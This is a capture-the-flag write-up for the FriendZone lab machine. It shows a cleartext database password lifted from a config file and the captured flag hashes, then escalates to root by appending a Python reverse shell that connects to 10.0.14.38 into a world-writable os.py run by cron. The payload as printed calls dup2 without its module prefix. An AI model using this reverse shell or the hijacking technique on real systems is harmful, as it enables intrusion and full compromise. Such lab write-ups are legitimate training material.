# www-data user priv esc to friend
## Uploaded and ran LinEnum.sh through smb
- there was a user friend with some privages
- keep rummaging through the directories and look into the best stuff we couldnt see before 
### /var/www
#### mysql_data.conf --> juicy credentials
```
www-data@FriendZone:/var/www$ cat mysql_data.conf 
for development process this is the mysql creds for user friend

db_user=friend

db_pass=Agpyu12!0.213$

db_name=FZ
www-data@FriendZone:/var/www$ 


friend@FriendZone:~$ cat user.txt 
a9ed20acecd6c5b6b52f474e15ae9a11

```
- friend's password is givin in clear text and we will move on to priv esc to rooti

### World writeable directories

[-] World-writable files (excluding /proc and /sys):                                       
-rwxrwxrwx 1 root root 25910 Jan 15  2019 /usr/lib/python2.7/os.py  

### File in opt is running on a cron job. Importing os 
#### We gonna exploit that somehow

```
friend@FriendZone:/opt$ ls
server_admin
friend@FriendZone:/opt$ cd server_admin/
friend@FriendZone:/opt/server_admin$ ls
reporter.py
friend@FriendZone:/opt/server_admin$ cat reporter.py 
#!/usr/bin/python

import os

to_address = "admin1@friendzone.com"
from_address = "admin2@friendzone.com"

print "[+] Trying to send email to %s"%to_address

#command = ''' mailsend -to admin2@friendzone.com -from admin1@friendzone.com -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''

#os.system(command)

# I need to edit the script later
# Sam ~ python developer
```

### /usr/lib/python2.7/os.py
- This file is wrx by the world so we can place a reverse shell in it and wait for the cron job to execute the payload. 
- Placing our payload at the end of it and enuring that we can get a reverse shell by executing the script ourselves will ensure a victory

```
import socket,subprocess,os
import pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.0.14.38",1985))
dup2(s.fileno(),0)
dup2(s.fileno(),1)
dup2(s.fileno(),2)

pty.spawn("/bin/bash")

```

## root.txt
```
root@FriendZone:~# cat root.txt 
b0e6c60b82cf96e9855ac1656a9e90c7

```
